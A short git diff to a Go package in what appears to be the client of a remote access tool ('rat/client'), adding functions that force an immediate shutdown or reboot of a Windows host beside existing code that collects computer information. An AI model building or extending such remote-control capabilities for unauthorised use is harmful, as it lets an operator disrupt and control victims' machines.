@@ -7,6 +7,7 @@ package computer
 import "C"
 
 import (
+	"os/exec"
 	"rat/client/utils"
 	"rat/common"
 	"unsafe"
@@ -33,4 +34,12 @@ func GetComputerInformation() common.Computer {
 	info.HomeDir = utils.TrimCStr(utils.GetWideString(lpBuffer, utils.GetLength(lpBuffer)))
 
 	return info
+}
+
+func Shutdown() {
+	exec.Command("shutdown", "/p", "/f").Start()
+}
+
+func Reboot() {
+	exec.Command("shutdown.exe", "/t", "0", "/r", "/f").Start()
 }
